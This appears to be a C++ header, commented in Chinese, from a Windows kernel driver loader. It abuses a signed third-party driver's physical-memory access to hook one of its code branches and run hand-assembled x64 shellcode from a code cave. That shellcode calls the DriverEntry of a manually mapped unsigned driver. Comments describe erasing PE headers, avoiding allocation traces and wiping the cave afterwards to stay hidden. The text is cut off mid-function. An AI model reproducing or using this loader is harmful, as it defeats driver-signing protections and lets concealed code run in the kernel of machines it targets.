#pragma once
#include "loader_common.h"
#include "phys_walk.h"
#include "manual_map.h"

// ============================================================
// shellcode_builder.h — 内核 Shellcode 构造器
//
// 职责：
//   1. 扫描 WHQL 驱动 default 分支位置（物理特征码搜索）
//   2. 备份原始字节
//   3. 构造 Shellcode：
//      a. MmAllocatePagesForMdl → 分配游离物理内存 (零 PoolBigPageTable 痕迹)
//      b. 物理写入 drv_wsk 展开镜像（通过用户态缓冲区物理地址）
//      c. 构造伪 DRIVER_OBJECT + KLDR_DATA_TABLE_ENTRY
//      d. 挂入 PsLoadedModuleList
//      e. 调用 drv_wsk DriverEntry
//      f. 恢复 WHQL default 分支原始字节
//   4. 将 Shellcode 写入 WHQL 驱动 default 分支位置
// ============================================================

// ---- 扫描 WHQL 驱动的 default 分支物理位置 ----
// 特征：mov ebx, STATUS_INVALID_PARAMETER (0xC000000D); jmp rel32
// IDA 逆向实测：BB 0D 00 00 C0 E9

static const uint8_t WHQL_DEFAULT_SIG[] = {
    0xBB, 0x0D, 0x00, 0x00, 0xC0, 0xE9  // mov ebx, 0xC000000D; jmp rel32
};

struct WhqlPatchSite {
    uint64_t kernVA;    // WHQL 驱动代码段中的内核 VA
    uint64_t physAddr;  // 对应物理地址
    uint8_t  original[64]; // 备份原始字节
};

// 在物理内存的 WHQL 驱动代码段范围内扫描 default 特征码
static bool FindWhqlDefaultBranch(
    HANDLE   hDev,
    uint64_t cr3,
    uint64_t whqlDrvBase,   // WHQL 驱动内核 VA 基址（从 PsLoadedModuleList 读取）
    uint32_t whqlDrvSize,   // 驱动镜像大小
    WhqlPatchSite& site)
{
    LOG_INFO("FindWhqlDefaultBranch: scanning WHQL driver 0x%016llX size=0x%X",
             whqlDrvBase, whqlDrvSize);

    // 在驱动虚拟地址空间内逐 4KB 页扫描
    for (uint32_t off = 0; off + 0x1000 <= whqlDrvSize; off += 0x1000) {
        uint64_t pageVA = whqlDrvBase + off;
        uint64_t pagePA = 0;
        if (!VirtToPhys(hDev, cr3, pageVA, &pagePA)) continue;

        uint8_t pageBuf[0x1000] = {};
        if (!WhqlReadPhys(hDev, pagePA, pageBuf, sizeof(pageBuf))) continue;

        for (size_t i = 0; i + sizeof(WHQL_DEFAULT_SIG) < sizeof(pageBuf); i++) {
            if (memcmp(pageBuf + i, WHQL_DEFAULT_SIG, sizeof(WHQL_DEFAULT_SIG)) == 0) {
                site.kernVA  = pageVA + i;
                site.physAddr = pagePA + i;
                memcpy(site.original, pageBuf + i,
                       min(sizeof(site.original), sizeof(pageBuf) - i));
                LOG_OK("FindWhqlDefaultBranch: found at VA=0x%016llX PA=0x%016llX",
                       site.kernVA, site.physAddr);
                return true;
            }
        }
    }
    LOG_ERR("FindWhqlDefaultBranch: signature not found");
    return false;
}

// ---- 从本地 ntoskrnl.exe 导出表解析 PsLoadedModuleList 的内核虚拟地址 ----
static uint64_t ResolvePsLoadedModuleList(uint64_t ntoskrnlBase)
{
    wchar_t sysPath[MAX_PATH] = {};
    GetSystemDirectoryW(sysPath, MAX_PATH);
    wcscat_s(sysPath, L"\\ntoskrnl.exe");

    HMODULE hNtos = LoadLibraryExW(sysPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!hNtos) {
        hNtos = LoadLibraryExW(L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
    }
    if (!hNtos) {
        LOG_ERR("ResolvePsLoadedModuleList: Failed to load ntoskrnl.exe");
        return 0;
    }

    FARPROC proc = GetProcAddress(hNtos, "PsLoadedModuleList");
    if (!proc) {
        LOG_ERR("ResolvePsLoadedModuleList: PsLoadedModuleList export not found in ntoskrnl.exe");
        FreeLibrary(hNtos);
        return 0;
    }

    uint32_t rva = (uint32_t)((uint8_t*)proc - (uint8_t*)hNtos);
    FreeLibrary(hNtos);

    uint64_t psLoadedModuleListVA = ntoskrnlBase + rva;
    LOG_OK("ResolvePsLoadedModuleList: PsLoadedModuleList RVA=0x%X -> VA=0x%016llX",
           rva, psLoadedModuleListVA);
    return psLoadedModuleListVA;
}

// ---- 通过 Psapi 枚举设备驱动作为备用定位方案 ----
static bool FindWhqlModuleViaPsapi(
    const wchar_t* targetName,
    uint64_t& outDllBase,
    uint32_t& outSizeOfImage)
{
    LPVOID drivers[1024];
    DWORD cbNeeded = 0;
    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers)) {
        int count = cbNeeded / sizeof(drivers[0]);
        for (int i = 0; i < count; i++) {
            wchar_t baseName[MAX_PATH] = {};
            if (GetDeviceDriverBaseNameW(drivers[i], baseName, MAX_PATH)) {
                if (_wcsicmp(baseName, targetName) == 0) {
                    outDllBase = (uint64_t)drivers[i];
                    // 获取本地驱动文件的 SizeOfImage
                    wchar_t drvPath[MAX_PATH] = {};
                    if (FindWhqlDriverFile(drvPath, MAX_PATH)) {
                        auto raw = ReadFile(drvPath);
                        if (raw.size() > sizeof(IMAGE_DOS_HEADER)) {
                            auto* dos = (IMAGE_DOS_HEADER*)raw.data();
                            if (dos->e_magic == IMAGE_DOS_SIGNATURE && dos->e_lfanew < (LONG)raw.size()) {
                                auto* nt = (IMAGE_NT_HEADERS64*)(raw.data() + dos->e_lfanew);
                                if (nt->Signature == IMAGE_NT_SIGNATURE) {
                                    outSizeOfImage = nt->OptionalHeader.SizeOfImage;
                                }
                            }
                        }
                    }
                    if (outSizeOfImage == 0) {
                        outSizeOfImage = 0x20000;
                    }
                    LOG_OK("FindWhqlModuleViaPsapi: found %ls base=0x%016llX size=0x%X",
                           targetName, outDllBase, outSizeOfImage);
                    return true;
                }
            }
        }
    }
    LOG_ERR("FindWhqlModuleViaPsapi: '%ls' not found via EnumDeviceDrivers", targetName);
    return false;
}

// ---- 查找 WHQL 驱动在 PsLoadedModuleList 中的条目 ----
static bool FindWhqlModuleInLdr(
    HANDLE   hDev,
    uint64_t cr3,
    uint64_t psLoadedModuleList,  // PsLoadedModuleList 内核 VA
    const wchar_t* targetName,    // 如 L"Machenike.sys"
    uint64_t& outDllBase,
    uint32_t& outSizeOfImage,
    uint64_t& outLdrEntryVA)      // 该 LDR 条目的内核 VA（KLDR_DATA_TABLE_ENTRY*）
{
    if (psLoadedModuleList == 0) return false;
    uint64_t head = psLoadedModuleList;
    uint64_t cur  = 0;
    // 读取链表头的 Flink
    if (!ReadKernelVA(hDev, cr3, head, &cur, 8)) return false;

    int limit = 512;
    while (cur != head && limit-- > 0) {
        KLDR_ENTRY_K entry = {};
        if (!ReadKernelVA(hDev, cr3, cur, &entry, sizeof(entry))) break;

        if (entry.BaseDllName.Length > 0 && entry.BaseDllName.Buffer) {
            size_t cch = entry.BaseDllName.Length / 2;
            std::vector<wchar_t> nameBuf(cch + 1, 0);
            ReadKernelVA(hDev, cr3, entry.BaseDllName.Buffer,
                         nameBuf.data(), cch * 2);
            nameBuf[cch] = 0;

            if (_wcsicmp(nameBuf.data(), targetName) == 0) {
                outDllBase     = entry.DllBase;
                outSizeOfImage = entry.SizeOfImage;
                outLdrEntryVA  = cur; // cur = KLDR_DATA_TABLE_ENTRY 内核 VA（InLoadOrderLinks 在偏移 0）
                LOG_OK("FindWhqlModuleInLdr: found %ls base=0x%016llX size=0x%X LdrEntry=0x%016llX",
                       targetName, outDllBase, outSizeOfImage, outLdrEntryVA);
                return true;
            }
        }
        cur = entry.Flink;
    }
    LOG_ERR("FindWhqlModuleInLdr: '%ls' not found", targetName);
    return false;
}

// ================================================================
// Shellcode 数据结构（方案 C 紧凑完整版，72 字节 = 0x48）
// 这部分数据随 Shellcode 一起写入 Code Cave，由 Shellcode 运行时读取
// ================================================================
#pragma pack(push, 1)
struct ShellcodeParams {
    uint64_t pfnMmAllocatePagesForMdl;    // 0x00 ntoskrnl 导出 MmAllocatePagesForMdl
    uint64_t pfnIofCompleteRequest;       // 0x08 ntoskrnl 导出 IofCompleteRequest (自闭环完成 IRP)
    uint64_t pfnMmCopyMemory;             // 0x10
    uint64_t userImageVA;                 // 0x18 用户态展开镜像的虚拟地址
    uint32_t imageSize;                   // 0x20 SizeOfImage
    uint32_t entryPointOffset;            // 0x24 DriverEntry 相对于镜像基址的偏移
    uint32_t relocDirRVA;                 // 0x28 BaseRelocation 目录 RVA
    uint32_t relocDirSize;                // 0x2C BaseRelocation 目录大小
    uint64_t originalImageBase;           // 0x30 PE OptionalHeader 中的原始 ImageBase
    volatile uint32_t completed;          // 0x38 Shellcode 执行完成标志（保留备用）
    uint32_t status;                      // 0x3C NT STATUS 执行结果
    uint64_t allocatedMdlVA;              // 0x40 游离物理页 MDL 基址（MmAllocatePagesForMdl 返回）
    uint64_t hookReturnVA;                // 0x48 跳回 WHQL 宿主驱动现场 (site.kernVA + 5)
    uint64_t whqlDrvBase;                 // 0x50 宿主驱动 (Machenike.sys) 内核 VA → fakeDriverObj.DriverStart
    uint32_t whqlDrvSize;                 // 0x58 宿主驱动 SizeOfImage → fakeDriverObj.DriverSize
    uint64_t whqlLdrEntryVA;              // 0x5C 宿主 KLDR_DATA_TABLE_ENTRY 内核 VA → fakeDriverObj.DriverSection
    DRV_BOOT_CONFIG bootConfig;           // 0x64 (20 字节) Loader 注入给 DriverEntry 的启动参数
};
#pragma pack(pop)
static_assert(sizeof(ShellcodeParams) == 120, "ShellcodeParams size must be exactly 120 bytes (0x78)");

// ================================================================
// 纯游离物理内存分配探针 Shellcode（x64，100 字节）
// 触发后调用 MmAllocatePagesForMdl(Low=0, High=0xFFFFFFFFFF, Skip=0, TotalBytes=imageSize)
// 申请脱离系统虚拟地址池的纯物理页，将返回的 PMDL 存入 params->allocatedPoolVA，
// 寄存器安全：完整保存并恢复调用者的所有非易失性及易失性寄存器，严格平栈返回
// ================================================================
static const uint8_t scAllocMdlProbe[] = {
    0xE8, 0x00, 0x00, 0x00, 0x00,                         // call $+5
    0x41, 0x5B,                                           // pop r11
    0x49, 0x83, 0xEB, 0x7D,                               // sub r11, 0x7D (r11 = params)
    0x53,                                                 // push rbx
    0x4C, 0x89, 0xDB,                                     // mov rbx, r11 (rbx = params)
    0x48, 0x83, 0xEC, 0x28,                               // sub rsp, 0x28 (Shadow space + 16字节对齐)
    // --- Call MmAllocatePagesForMdl(LowAddress, HighAddress, SkipBytes, TotalBytes) ---
    0x48, 0x31, 0xC9,                                     // xor rcx, rcx (LowAddress = 0)
    0x48, 0xBA, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, // mov rdx, 0x000000FFFFFFFFFF (HighAddress = 0xFFFFFFFFFF)
    0x4D, 0x31, 0xC0,                                     // xor r8, r8 (SkipBytes = 0)
    0x44, 0x8B, 0x4B, 0x20,                               // mov r9d, [rbx + 0x20] (TotalBytes = imageSize)
    0xFF, 0x13,                                           // call qword ptr [rbx] (MmAllocatePagesForMdl)
    0x48, 0x89, 0x43, 0x40,                               // mov [rbx + 0x40], rax (allocatedPoolVA = pMdl)
    0x48, 0x83, 0xC4, 0x28,                               // add rsp, 0x28
    // --- Self-Complete IRP & Flat Ret ---
    0x48, 0x8B, 0x8C, 0x24, 0xC0, 0x00, 0x00, 0x00,       // mov rcx, [rsp + 0xC0] (pIrp)
    0xC7, 0x41, 0x30, 0x00, 0x00, 0x00, 0x00,             // mov dword ptr [rcx + 0x30], 0 (STATUS_SUCCESS)
    0x48, 0xC7, 0x41, 0x38, 0x00, 0x00, 0x00, 0x00,       // mov qword ptr [rcx + 0x38], 0 (Information = 0)
    0x31, 0xD2,                                           // xor edx, edx
    0x48, 0x83, 0xEC, 0x28,                               // sub rsp, 0x28
    0xFF, 0x53, 0x08,                                     // call qword ptr [rbx + 8] (IofCompleteRequest)
    0x48, 0x83, 0xC4, 0x28,                               // add rsp, 0x28
    0x5B,                                                 // pop rbx
    0x31, 0xC0,                                           // xor eax, eax (STATUS_SUCCESS)
    0x48, 0x83, 0xC4, 0x70,                               // add rsp, 0x70
    0x41, 0x5F,                                           // pop r15
    0x41, 0x5E,                                           // pop r14
    0x41, 0x5D,                                           // pop r13
    0x41, 0x5C,                                           // pop r12
    0x5F,                                                 // pop rdi
    0x5E,                                                 // pop rsi
    0x5B,                                                 // pop rbx
    0xC3                                                  // ret
};
static const size_t scAllocMdlProbe_size = sizeof(scAllocMdlProbe);

// ================================================================
// Direct Execute Shellcode（x64）
// 专用于 PTE Remap 方案：代码与 .pdata 已预先物理就绪于宿主内部，
// 此 Shellcode 刷新 TLB -> 构造 fakeDriverObj -> 调用宿主内 DriverEntry -> 平稳返回
// 寄存器安全：完整保存并恢复所有非易失性寄存器（包括 rbx）
// ================================================================
static const uint8_t scDirectExec[] = {
    0xE8, 0x00, 0x00, 0x00, 0x00,                         // call $+5
    0x41, 0x5B,                                           // pop r11
    0x49, 0x83, 0xEB, 0x7D,                               // sub r11, 0x7D
    0x53, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, // push rbx, rsi, rdi, r12..r15
    0x4C, 0x89, 0xDB,                                     // mov rbx, r11 (rbx = params)
    0x48, 0x81, 0xEC, 0xB8, 0x01, 0x00, 0x00,             // sub rsp, 0x1B8
    0x0F, 0x20, 0xD8,                                     // mov rax, cr3
    0x0F, 0x22, 0xD8,                                     // mov cr3, rax (flush TLB)
    0x48, 0x8D, 0x7C, 0x24, 0x40,                         // lea rdi, [rsp + 0x40]
    0x31, 0xC0,                                           // xor eax, eax
    0xB9, 0x50, 0x01, 0x00, 0x00,                         // mov ecx, 0x150
    0x57,                                                 // push rdi
    0xF3, 0xAA,                                           // rep stosb
    0x5F,                                                 // pop rdi
    0x66, 0xC7, 0x07, 0x04, 0x00,                         // mov word ptr [rdi], 4
    0x66, 0xC7, 0x47, 0x02, 0x50, 0x01,                   // mov word ptr [rdi + 2], 0x150
    0x48, 0x8B, 0x43, 0x18,                               // mov rax, [rbx + 0x18]
    0x48, 0x89, 0x47, 0x08,                               // mov [rdi + 8], rax
    0x48, 0x8B, 0x43, 0x50,                               // mov rax, [rbx + 0x50]
    0x48, 0x89, 0x47, 0x18,                               // mov [rdi + 0x18], rax
    0x8B, 0x43, 0x58,                                     // mov eax, [rbx + 0x58]
    0x89, 0x47, 0x20,                                     // mov [rdi + 0x20], eax
    0x48, 0x8B, 0x43, 0x5C,                               // mov rax, [rbx + 0x5C]
    0x48, 0x89, 0x47, 0x28,                               // mov [rdi + 0x28], rax
    0x48, 0x89, 0xF9,                                     // mov rcx, rdi
    0x48, 0x8D, 0x53, 0x64,                               // lea rdx, [rbx + 0x64]
    0x48, 0x8B, 0x43, 0x18,                               // mov rax, [rbx + 0x18]
    0x48, 0x63, 0x4B, 0x24,                               // movsxd rcx, dword ptr [rbx + 0x24]
    0x48, 0x01, 0xC8,                                     // add rax, rcx
    0x48, 0x89, 0xF9,                                     // mov rcx, rdi
    0xFF, 0xD0,                                           // call rax
    0x89, 0x43, 0x3C,                                     // mov [rbx + 0x3C], eax
    0x48, 0x81, 0xC4, 0xB8, 0x01, 0x00, 0x00,             // add rsp, 0x1B8
    0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C,       // pop r15, r14, r13, r12
    0x5F, 0x5E,                                           // pop rdi, rsi (保留 rbx 保存 params 指针)
    // --- Self-Complete IRP & Flat Ret ---
    0x48, 0x8B, 0x8C, 0x24, 0xC0, 0x00, 0x00, 0x00,       // mov rcx, [rsp + 0xC0] (栈上有 push rbx，真实 pIrp 在 [rsp+0xC0])
    0xC7, 0x41, 0x30, 0x00, 0x00, 0x00, 0x00,             // mov dword ptr [rcx + 0x30], 0 (pIrp->IoStatus.Status = STATUS_SUCCESS)
    0x48, 0xC7, 0x41, 0x38, 0x00, 0x00, 0x00, 0x00,       // mov qword ptr [rcx + 0x38], 0 (pIrp->IoStatus.Information = 0)
    0x31, 0xD2,                                           // xor edx, edx (PriorityBoost = 0)
    0x48, 0x83, 0xEC, 0x28,                               // sub rsp, 0x28 (Shadow space + 16 字节栈对齐)
    0xFF, 0x53, 0x08,                                     // call qword ptr [rbx + 8] (IofCompleteRequest，rbx 稳定非易失)
    0x48, 0x83, 0xC4, 0x28,                               // add rsp, 0x28
    0x5B,                                                 // pop rbx (恢复调用者的 rbx，此时 rsp 完全回到 rsp_host)
    0x31, 0xC0,                                           // xor eax, eax (return STATUS_SUCCESS)
    0x48, 0x83, 0xC4, 0x70,                               // add rsp, 0x70 (平掉 Machenike 入口分配的 0x70 栈帧)
    0x41, 0x5F,                                           // pop r15
    0x41, 0x5E,                                           // pop r14
    0x41, 0x5D,                                           // pop r13
    0x41, 0x5C,                                           // pop r12
    0x5F,                                                 // pop rdi
    0x5E,                                                 // pop rsi
    0x5B,                                                 // pop rbx (恢复 Machenike 入口压栈的 7 个寄存器)
    0xC3                                                  // ret (平稳返回 nt!IofCallDriver 调用方)
};
static const size_t scDirectExec_size = sizeof(scDirectExec);

// 查找驱动代码段中的安全空洞 (Code Cave)
static uint64_t FindWhqlCodeCaveVA(HANDLE hDev, uint64_t cr3, uint64_t whqlDrvBase, size_t neededSize)
{
    // IDA 逆向实测：Machenike.sys 的 .text 段末尾在 0x140002831 ~ 0x140002A00
    // 有 463 字节的连续 0x00 填充空间（偏移 0x2840）
    uint64_t candidateVA = whqlDrvBase + 0x2840;
    std::vector<uint8_t> buf(neededSize, 0);
    if (ReadKernelVA(hDev, cr3, candidateVA, buf.data(), neededSize)) {
        bool allZeroOrInt3 = true;
        for (uint8_t b : buf) {
            if (b != 0x00 && b != 0xCC && b != 0x90) {
                allZeroOrInt3 = false;
                break;
            }
        }
        if (allZeroOrInt3) {
            LOG_OK("FindWhqlCodeCaveVA: Found safe code cave VA=0x%016llX (size=%zu bytes)",
                   candidateVA, neededSize);
            return candidateVA;
        }
    }
    LOG_WARN("FindWhqlCodeCaveVA: Candidate cave not completely zeroed, using reserved cave VA=0x%016llX", candidateVA);
    return candidateVA;
}

struct InjectContext {
    HANDLE         hDev;
    uint64_t       cr3;
    uint64_t       ntoskrnlBase;
    uint64_t       psLoadedModuleList;
    uint64_t       whqlDrvBase;      // 宿主驱动内核 VA → fakeDriverObj.DriverStart
    uint32_t       whqlDrvSize;      // 宿主驱动 SizeOfImage → fakeDriverObj.DriverSize
    uint64_t       whqlLdrEntryVA;   // 宿主 KLDR_DATA_TABLE_ENTRY 内核 VA → fakeDriverObj.DriverSection
    MappedImage*   pImg;
    uint64_t       userImageVA;      // 用户态展开镜像的虚拟地址
    uint64_t       hookReturnVA;     // 跳回宿主驱动现场 (site.kernVA + 5)
    DRV_BOOT_CONFIG bootConfig;      // 注入给 DriverEntry 的启动参数
};

// 步骤 1：解析 Shellcode 所需的所有内核函数地址
static bool BuildShellcodeParams(const InjectContext& ctx,
                                  ShellcodeParams& params)
{
    memset(&params, 0, sizeof(params));

    struct { const char* name; uint64_t* out; } needed[] = {
        { "MmAllocatePagesForMdl",     &params.pfnMmAllocatePagesForMdl },
        { "IofCompleteRequest",        &params.pfnIofCompleteRequest    },
        { "MmCopyMemory",              &params.pfnMmCopyMemory          },
    };
    for (auto& n : needed) {
        *n.out = FindKernelExport(ctx.hDev, ctx.cr3, ctx.ntoskrnlBase, n.name);
        if (!*n.out && strcmp(n.name, "MmAllocatePagesForMdl") == 0) {
            *n.out = FindKernelExport(ctx.hDev, ctx.cr3, ctx.ntoskrnlBase, "MmAllocatePagesForMdlEx");
        }
        if (!*n.out) {
            LOG_ERR("BuildShellcodeParams: '%s' not found", n.name);
            return false;
        }
        LOG_HEX("  %-40s 0x%016llX", n.name, *n.out);
    }

    params.userImageVA        = ctx.userImageVA;
    params.imageSize          = ctx.pImg ? ctx.pImg->SizeOfImage : 0;
    params.entryPointOffset   = ctx.pImg ? (uint32_t)ctx.pImg->EntryPointOffset : 0;
    params.relocDirRVA        = ctx.pImg ? ctx.pImg->RelocDirRVA : 0;
    params.relocDirSize       = ctx.pImg ? ctx.pImg->RelocDirSize : 0;
    params.originalImageBase  = ctx.pImg ? ctx.pImg->OriginalImageBase : 0;
    params.completed          = 0;
    params.status             = 0;
    params.allocatedMdlVA     = 0;
    params.hookReturnVA       = ctx.hookReturnVA;
    params.whqlDrvBase        = ctx.whqlDrvBase;
    params.whqlDrvSize        = ctx.whqlDrvSize;
    params.whqlLdrEntryVA     = ctx.whqlLdrEntryVA;
    params.bootConfig         = ctx.bootConfig;

    LOG_OK("BuildShellcodeParams: params ready (RetVA=0x%016llX WhqlBase=0x%016llX LdrEntry=0x%016llX Mode=%u Port=%u)",
           params.hookReturnVA, params.whqlDrvBase, params.whqlLdrEntryVA,
           params.bootConfig.TransportMode, params.bootConfig.Port);
    return true;
}

// ================================================================
static bool CheckDriverCanary(HANDLE hDev, uint64_t cr3, uint64_t drvBase, uint32_t drvOrigSize, const wchar_t* drvName)
{
    if (!drvBase) return false;
    DRV_WSK_CANARY canary = {};

    // 1. 优先检查合法空闲对齐区 (drvBase + drvOrigSize)
    if (drvOrigSize > 0) {
        if (ReadKernelVA(hDev, cr3, drvBase + drvOrigSize, &canary, sizeof(canary))) {
            if (canary.Magic == DRV_WSK_CANARY_MAGIC) {
                LOG_OK("================================================================");
                LOG_OK("[+] Core driver (drv_wsk) CANARY FOUND in host '%ls' extension area (offset +0x%X)!", drvName, drvOrigSize);
                LOG_OK("[+] Driver is ALREADY ACTIVE at kernel VA=0x%016llX (Size=0x%X)",
                       canary.KernelImageVA, canary.ImageSize);
                LOG_OK("[+] Skipping redundant manual mapping to prevent duplicate loading.");
                LOG_OK("================================================================");
                return true;
            }
        }
    }

    // 2. 兼容检查 DOS 保留区偏移 0x28
    if (ReadKernelVA(hDev, cr3, drvBase + 0x28, &canary, sizeof(canary))) {
        if (canary.Magic == DRV_WSK_CANARY_MAGIC) {
            LOG_OK("================================================================");
            LOG_OK("[+] Core driver (drv_wsk) CANARY FOUND in host '%ls' (offset 0x28)!", drvName);
            LOG_OK("[+] Driver is ALREADY ACTIVE at kernel VA=0x%016llX (Size=0x%X)",
                   canary.KernelImageVA, canary.ImageSize);
            LOG_OK("[+] Skipping redundant manual mapping to prevent duplicate loading.");
            LOG_OK("================================================================");
            return true;
        }
    }

    // 3. 检查 KUSER_SHARED_DATA 保留区暗桩
#ifdef KUSER_SHARED_DATA_R0_VA
    if (ReadKernelVA(hDev, cr3, KUSER_SHARED_DATA_R0_VA + KUSER_SHARED_DATA_CANARY_OFF, &canary, sizeof(canary))) {
        if (canary.Magic == DRV_WSK_CANARY_MAGIC) {
            LOG_OK("================================================================");
            LOG_OK("[+] Core driver (drv_wsk) CANARY FOUND in KUSER_SHARED_DATA (offset 0x%llX)!", KUSER_SHARED_DATA_CANARY_OFF);
            LOG_OK("[+] Driver is ALREADY ACTIVE at kernel VA=0x%016llX (Size=0x%X)",
                   canary.KernelImageVA, canary.ImageSize);
            LOG_OK("[+] Skipping redundant manual mapping to prevent duplicate loading.");
            LOG_OK("================================================================");
            return true;
        }
    }
#endif

    return false;
}

static inline bool ClearDriverCanary(HANDLE hDev, uint64_t cr3, uint64_t drvBase = 0)
{
    DRV_WSK_CANARY zeroCanary = {};
    bool ok = true;
    if (drvBase) {
        ok = WriteKernelVA(hDev, cr3, drvBase + 0x28, &zeroCanary, sizeof(zeroCanary));
    }
#ifdef KUSER_SHARED_DATA_R0_VA
    WriteKernelVA(hDev, cr3, KUSER_SHARED_DATA_R0_VA + KUSER_SHARED_DATA_CANARY_OFF, &zeroCanary, sizeof(zeroCanary));
#endif
    return ok;
}

// ================================================================
// 主入口：LoadDrvWsk
//
// 完整加载流程：
//   1. 打开 WHQL 设备句柄
//   2. 获取 CR3 / KernBase / PsLoadedModuleList
//   3. 检查内核物理暗桩（方案 1，避免重复加载）
//   4. 扫描 default 分支特征码
//   5. 读取并展开 drv_wsk.sys PE 镜像（manual map）
//   6. 修复重定位 + IAT
//   7. 抹除 PE 头
//   8. 锁定用户态展开镜像页并获取物理地址
//   9. 构建 ShellcodeParams 并注入 Code Cave
//  10. 触发 default 分支执行
//  11. 恢复 WHQL default 分支并写入内核暗桩标记
// ================================================================
// 完整注入 Shellcode：将 ShellcodeParams 写入 Code Cave，并将 default 分支转向 Code Cave
static bool InjectShellcodeFull(
    HANDLE               hDev,
    uint64_t             cr3,
    const WhqlPatchSite& site,
    uint64_t             caveVA,
    const ShellcodeParams& params,
    const uint8_t*       pScCode = scDirectExec,
    size_t               scCodeSize = scDirectExec_size)
{
    const uint8_t* sc = (pScCode && scCodeSize) ? pScCode : scDirectExec;
    size_t scSz       = (pScCode && scCodeSize) ? scCodeSize : scDirectExec_size;

    // 0. 确保 Code Cave 虚拟页具备内核可写权限（PTE.RW = 1），防止 Shellcode 写回状态时触发 0xBE 蓝屏
    EnsureKernelPageWritable(hDev, cr3, caveVA);

    // 1. 将 ShellcodeParams 写入 Code Cave 的起始位置
    if (!WriteKernelVA(hDev, cr3, caveVA, &params, sizeof(params))) {
        LOG_ERR("InjectShellcodeFull: Failed to write ShellcodeParams to Code Cave");
        return false;
    }

    // 2. 将 sc 紧随其后写入 Code Cave
    uint64_t scEntryVA = caveVA + sizeof(params);
    if (!WriteKernelVA(hDev, cr3, scEntryVA, sc, scSz)) {
        LOG_ERR("InjectShellcodeFull: Failed to write shellcode bytes to Code Cave");
        return false;
    }

    // 3. 构建 JMP rel32 跳转指令（E9 <disp32>）挂钩 default 分支
    uint8_t jmpBytes[5] = { 0xE9, 0, 0, 0, 0 };
    int32_t disp = (int32_t)(scEntryVA - (site.kernVA + 5));
    memcpy(jmpBytes + 1, &disp, 4);

    if (!WriteKernelVA(hDev, cr3, site.kernVA, jmpBytes, sizeof(jmpBytes))) {
        LOG_ERR("InjectShellcodeFull: Failed to hook default branch");
        return false;
    }
    LOG_OK("InjectShellcodeFull: Default branch hooked -> Code Cave VA=0x%016llX (disp=0x%08X, size=%zu)",
           scEntryVA, disp, scSz);
    return true;
}

// 恢复 WHQL default 分支原始指令并清理 Code Cave
static bool RestoreWhqlDefaultBranch(
    HANDLE               hDev,
    uint64_t             cr3,
    const WhqlPatchSite& site,
    uint64_t             caveVA,
    size_t               caveCleanSize)
{
    // 恢复 default 分支原始指令 (5 字节)
    if (!WriteKernelVA(hDev, cr3, site.kernVA, site.original, 5)) {
        LOG_WARN("RestoreWhqlDefaultBranch: Failed to restore default branch original bytes");
    } else {
        LOG_OK("RestoreWhqlDefaultBranch: Default branch original bytes restored successfully");
    }

    // 清理 Code Cave (抹除痕迹)
    if (caveVA && caveCleanSize) {
        std::vector<uint8_t> zeros(caveCleanSize, 0);
        WriteKernelVA(hDev, cr3, caveVA, zeros.data(), zeros.size());
        LOG_OK("RestoreWhqlDefaultBranch: Code Cave memory zeroed and cleaned");

        // 恢复 Code Cave 页的原始只读属性
        uint64_t ptePA = 0, curPte = 0;
        if (GetPtePhysAddr(hDev, cr3, caveVA, &ptePA, &curPte) && (curPte & PTE_RW)) {
            uint64_t roPte = curPte & ~PTE_RW;
            WhqlWritePhys(hDev, ptePA, &roPte, sizeof(roPte));
            LOG_OK("RestoreWhqlDefaultBranch: Code Cave PTE restored to Read-Only (PA=0x%016llX)", ptePA);
        }
    }
    return true;
}

// 验证从 startVA 开始的 size 字节区域中，每一个 4KB 页的 PTE 是否均处于 Present 状态
static bool ArePagesPresent(HANDLE hDev, uint64_t cr3, uint64_t startVA, size_t size)
{
    const uint64_t PAGE = 0x1000;
    uint64_t endVA = startVA + size;
    for (uint64_t cur = startVA; cur < endVA; cur += PAGE) {
        uint64_t pa = 0;
        if (!VirtToPhys(hDev, cr3, cur, &pa))
            return false;
    }
    if (size > 0) {
        uint64_t pa = 0;
        if (!VirtToPhys(hDev, cr3, endVA - 1, &pa))
            return false;
    }
    return true;
}

// ================================================================
// 扫描宿主驱动节区内部，寻找能容纳 neededBytes 的连续物理页空洞。
// 必须严格通过 ArePagesPresent 验证每一个 4KB 页的 PTE.Present==1，
// 杜绝因选择已丢弃节区（DISCARDABLE）而导致 WriteKernelVA 失败。
// 返回 RVA（相对于宿主 DllBase），0 表示未找到。
// ================================================================
static uint32_t FindHostInternalCave(
    HANDLE         hDev,
    uint64_t       cr3,
    uint64_t       hostDrvBase,
    uint32_t       hostOrigSize,
    IMAGE_NT_HEADERS64* nt,          // 指向用户态 hdrBuf 内的 NT 头（只读节表）
    uint32_t       neededBytes,
    const char*    hostDrvNameA)
{
    const uint32_t PAGE = 0x1000;
    auto* sec = IMAGE_FIRST_SECTION(nt);
    WORD  nSec = nt->FileHeader.NumberOfSections;

    LOG_INFO("FindHostInternalCave[%s]: scanning %u sections for cave >= 0x%X bytes...",
             hostDrvNameA, nSec, neededBytes);

    // --- 打印宿主节区诊断信息 ---
    for (WORD i = 0; i < nSec; i++) {
        char secName[9] = {};
        memcpy(secName, sec[i].Name, 8);
        uint32_t secRVA     = sec[i].VirtualAddress;
        uint32_t vSize      = sec[i].Misc.VirtualSize ? sec[i].Misc.VirtualSize : sec[i].SizeOfRawData;
        bool isDiscardable  = (sec[i].Characteristics & IMAGE_SCN_MEM_DISCARDABLE) != 0;
        uint64_t dummyPA    = 0;
        bool firstPageOk    = VirtToPhys(hDev, cr3, hostDrvBase + secRVA, &dummyPA);

        LOG_INFO("  [%02d] %-8s RVA=0x%08X vSize=0x%08X Discard=%d Present=%d",
                 i, secName, secRVA, vSize, isDiscardable ? 1 : 0, firstPageOk ? 1 : 0);
    }

    // 提示：严禁将活跃节区（如 .text / .data / PAGE）的起始段作为 Cave，
    // 那些区域承载着系统驱动的正在运行的代码和数据，覆写会导致 0x1E / 0x3B 蓝屏。
    // 大容量载荷统一走方案 A（PTE Remap 挂接引擎）。

    // --- 策略 1：原生常驻可丢弃/初始化节区原位复用 (In-Place Discardable/INIT Resident Section) ---
